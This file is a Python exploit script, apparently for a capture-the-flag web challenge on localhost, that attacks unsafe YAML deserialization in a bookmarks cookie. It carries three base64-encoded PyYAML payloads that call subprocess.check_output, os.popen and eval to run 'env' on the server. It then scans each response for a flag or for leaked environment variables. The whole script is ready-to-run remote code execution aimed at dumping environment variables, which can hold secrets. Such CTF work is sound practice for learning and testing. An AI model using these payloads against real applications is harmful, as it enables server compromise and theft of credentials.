#!/usr/bin/env python3
import base64
import requests
import re

target = "http://127.0.0.1:5000"

# Original bookmarks cookie format analysis:
# - !!python/object:app.models.UrlObj
#   name: test
#   url: http://example.com

# Exploit payloads for YAML deserialization to execute 'env' command

payloads = {
    "subprocess_check_output": "- !!python/object/apply:subprocess.check_output\n  args: [['env']]\n",
    "os_popen": "- !!python/object/apply:os.popen\n  args: ['env']\n",
    "eval_getoutput": "- !!python/object/apply:eval\n  args: [\"__import__('subprocess').getoutput('env')\"]\n",
}

print("[*] YAML Deserialization Attack for ENV Command Exfiltration\n")

for name, payload in payloads.items():
    print(f"[*] Testing: {name}")
    print(f"    Payload: {payload.strip()}")
    
    encoded = base64.b64encode(payload.encode()).decode()
    print(f"    Base64: {encoded[:50]}...")
    
    cookies = {'user': 'aea729d9fd8b4083b533db2c69e8e238', 'bookmarks': encoded}
    
    try:
        resp = requests.get(target, cookies=cookies, timeout=5)
        print(f"    Status: {resp.status_code} | Length: {len(resp.text)}")
        
        if 'FLAG{' in resp.text:
            flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
            print(f"\n[!] FLAG FOUND: {flags[0]}")
            print(f"\n[+] Full Response:\n{resp.text}\n")
            break
        elif any(env_var in resp.text for env_var in ['PATH=', 'HOME=', 'USER=']):
            print(f"    [+] Environment variables detected!")
            print(f"\n[+] Response:\n{resp.text}\n")
            
    except Exception as e:
        print(f"    [-] Error: {e}")
    
    print()

